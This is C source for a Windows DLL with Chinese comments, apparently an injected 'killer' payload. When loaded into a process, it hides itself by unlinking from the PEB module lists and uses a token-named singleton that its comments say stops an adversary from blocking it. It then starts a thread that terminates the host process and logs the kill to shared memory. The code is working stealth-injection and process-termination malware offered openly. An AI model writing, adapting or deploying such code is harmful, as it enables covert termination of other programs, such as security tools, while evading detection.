#include <windows.h>
#include <stdio.h>
#include <stdarg.h>

/* 共享内存布局与命名常量：唯一来源见 xxipc.h */
#include "xxipc.h"

static ULONGLONG g_dwNameToken = 0;       /* 会话随机名 token：只由 XxSetNames 送进来 */

/* 远程导出：接收会话随机名（方案 A；参数块由注入方清零并释放） */
__declspec(dllexport) BOOL WINAPI XxSetNames(const XX_NAME_BLOCK *pBlock) {
    ULONGLONG tok = 0;
    if (!XXNameBlockTake(pBlock, &tok, NULL)) return FALSE;
    if (tok) g_dwNameToken = tok;
    return TRUE;
}

static void WriteKillerLog(const WCHAR *fmt, ...) {
    HANDLE hMap = XXOpenShared();
    if (!hMap) return;
    PVOID pView = MapViewOfFile(hMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, SHARED_MEM_SIZE);
    if (!pView) { CloseHandle(hMap); return; }

    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR szLine[512];
    va_list args;
    va_start(args, fmt);
    _vsnwprintf(szLine, _countof(szLine) - 1, fmt, args);
    va_end(args);
    szLine[_countof(szLine) - 1] = L'\0';

    WCHAR entry[600];
    _snwprintf(entry, _countof(entry) - 1, L"[%02d:%02d:%02d.%03d] [killer] %s\r\n",
               st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, szLine);
    entry[_countof(entry) - 1] = L'\0';

    WCHAR *pLog = (WCHAR *)((BYTE *)pView + OFFSET_LOG);
    size_t maxLen = (LOG_SIZE / sizeof(WCHAR)) - 1;
    size_t len = XXLogLen(pLog, maxLen + 1);
    if (len > maxLen) { pLog[maxLen] = L'\0'; len = maxLen; }
    size_t newLen = wcslen(entry);
    if (len + newLen <= maxLen) {
        /* 第二参是缓冲区总容量（含结尾 NUL），不是剩余空间 */
        wcscat_s(pLog, maxLen + 1 - len, entry);
    } else {
        /* 丢掉最旧的一段，只保留最近 maxLen 个字符 */
        size_t drop = len + newLen - maxLen;
        if (drop < len) {
            memmove(pLog, pLog + drop, (len - drop) * sizeof(WCHAR));
            pLog[len - drop] = L'\0';
        } else {
            pLog[0] = L'\0';
        }
        wcscat_s(pLog, maxLen + 1 - wcslen(pLog), entry);
    }

    UnmapViewOfFile(pView);
    CloseHandle(hMap);
}

DWORD WINAPI PayloadThread(LPVOID lp) {
    Sleep(100);
    WCHAR path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    const WCHAR *base = wcsrchr(path, L'\\');
    base = base ? base + 1 : path;
    DWORD pid = GetCurrentProcessId();
    WriteKillerLog(L"Payload 触发，准备结束自身进程: %s PID=%lu", base, pid);
    TerminateProcess(GetCurrentProcess(), 0);
    WriteKillerLog(L"TerminateProcess 返回 (未生效?) PID=%lu", pid);
    ExitProcess(0);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {    UNREFERENCED_PARAMETER(reserved);
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinst);
        WCHAR path[MAX_PATH];
        const WCHAR *base;
        GetModuleFileNameW(NULL, path, MAX_PATH);
        base = wcsrchr(path, L'\\');
        base = base ? base + 1 : path;
        DWORD pid = GetCurrentProcessId();

        /* 按文件名比较：wcsstr 连 "C:\xx\notepad.exe" 这种路径也会命中 */
        if (_wcsicmp(base, XX_EXE_NAME_W) == 0) {
            WriteKillerLog(L"跳过自身 xx.exe PID=%lu", pid);
            return TRUE;
        }

        /* 进程内单例：模块隐藏后注入方看不到我们，会反复注入；
           已有实例时直接让加载失败，避免同一进程里塞进多份载荷。
           名字带会话 token，对手没法预先抢占这个单例把载荷挡在门外。 */
        XXWaitToken(&g_dwNameToken, 300);   /* 等注入方送名字（避免同名/异名错配） */
        if (!XXModuleSingleton(L"payload", g_dwNameToken)) return FALSE;

        XXHideSelfFromPeb(hinst);          /* 从 PEB 三条模块链表里摘除自己 */

        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    }
    return TRUE;
}
